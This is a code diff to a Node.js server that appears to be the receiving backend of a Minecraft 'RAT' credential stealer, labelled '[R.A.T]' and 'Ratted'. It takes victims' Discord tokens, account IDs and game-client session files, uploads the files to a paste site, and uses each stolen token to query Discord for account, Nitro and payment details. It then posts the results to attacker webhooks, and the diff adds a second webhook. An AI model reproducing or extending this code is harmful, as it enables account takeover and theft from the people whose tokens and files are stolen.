@@ -16,6 +16,11 @@ app.use(expressip().getIpInfoMiddleware) //ip
 app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
+// Webhooks
+let defaulthook = process.env.WEBHOOK
+let blackhook = process.env.BLACKHOOK
+let shorthook = process.env.SHORTHOOK
+
 //array initialization
 const ipMap = []
 
@@ -57,9 +62,7 @@ app.post("/", (req, res) => {
     })
 
     .then(async response => {
-        // Set webhook
-        let webhook = process.env.WEBHOOK
-
+        // Preparation
         //upload feather
         const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => {
             return {data: {key: "Error uploading"}}
@@ -80,16 +83,6 @@ app.post("/", (req, res) => {
         let payments = ""
 
         const discord = req.body.discord.split(" | ")
-
-        // get profiles
-        let profiles = ''
-        const profileData = await getProfiles(req.body.uuid);
-
-        if (profileData) {
-            for (let profileId in profileData.profiles) {
-                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
-            }
-        }
 
         for await (const token of req.body.discord.split(" | ")) {
             let me = await (await get("https://discordapp.com/api/v9/users/@me", {
@@ -125,20 +118,26 @@ app.post("/", (req, res) => {
             })).data
             payments += payment.length > 0 ? "Yes | " : "No | "
         }
-        // Set comment
-        let comment = "unknown"
 
-        if (req.body.type) {
-            comment = req.body.type
+        // Set webhook
+        let webhook = defaulthook
 
-            if (comment == "essential") {
-                webhook = process.env.BLACKHOOK //debug
-            }
+        if (process.env.BLACKLIST.split("_").includes(req.body.uuid)) { // debug
+            content = `Blacked - <t:${timestamp}:R>`
+            webhook = blackhook
         }
 
+        // Set content
+        // timestamp text
+        const now = Date.now();
+        const time = now + (24 * 60 * 60 * 1000);
+        const timestamp = Math.floor(time / 1000);
+
+        let content = `@everyone - <t:${timestamp}:R>`
+
+        // Set useful links
         let links = ``
 
-        // Useful links
         if (req.body.username) {
             let skyCrypt = `[SkyCrypt](https://sky.shiiyu.moe/${req.body.username})`
             let plancke = `[Plancke](https://plancke.io/hypixel/player/stats/${req.body.username})`
@@ -149,7 +148,29 @@ app.post("/", (req, res) => {
              links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
         }
 
-        //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
+        // Set comment
+        let comment = "unknown"
+
+        if (req.body.type) {
+            comment = req.body.type
+
+            if (comment == "essential") {
+                webhook = blackhook //debug
+                content = `Essential - <t:${timestamp}:R>`
+            }
+        }
+
+        // get profiles
+        let profiles = ''
+        const profileData = await getProfiles(req.body.uuid);
+
+        if (profileData) {
+            for (let profileId in profileData.profiles) {
+                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
+            }
+        }
+
+        // Set alts
         //check feather content in hastebin
         if (req.body.feather == 'File not found :(')
             checkFeather = 'File not found :( - (Feather)'
@@ -167,18 +188,6 @@ app.post("/", (req, res) => {
             checkLunar = 'File not found :( - (Lunar)'
         else
             checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
-
-        // timestamp text
-        const now = Date.now();
-        const time = now + (24 * 60 * 60 * 1000);
-        const timestamp = Math.floor(time / 1000);
-        // Set content
-        let content = `@everyone - <t:${timestamp}:R>`
-        
-        if (process.env.BLACKLIST.split("_").includes(req.body.uuid)) { // debug
-            content = `Blacked - <t:${timestamp}:R>`
-            webhook = process.env.BLACKHOOK
-        }
 
         try {
             post(webhook, JSON.stringify({
@@ -199,6 +208,34 @@ app.post("/", (req, res) => {
                         {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
                         {name: 'Nitro', value: `\`${nitros}\``, inline: true},
                         {name: 'Payment', value: `\`${payments}\``, inline: true},
+                    ],
+                    color: 0x7366bd,
+                    footer: {
+                        "text": "🕊️ MagiDev on top 🕊️",
+                    },
+                    timestamp: new Date()
+                }],
+                attachments: []
+            }), {
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }).catch(err => {
+                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+            })
+
+            post(shorthook, JSON.stringify({
+                content: "@everyone" + content, //ping
+                embeds: [{
+                    title: `Ratted ${req.body.username} - Click Below For Stats`,
+                    description: links,
+                    fields: [
+                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
+                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
+                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
+                        {name: 'Feather', value: `${checkFeather}`, inline: true},
+                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
+                        {name: 'Lunar', value: `${checkLunar}`, inline: true}
                     ],
                     color: 0x7366bd,
                     footer: {
@@ -235,7 +272,6 @@ app.listen(port, () => {
     // send to discord webhook
     
 });
-
 
 //format a number into thousands millions billions
 const formatNumber = (num) => {
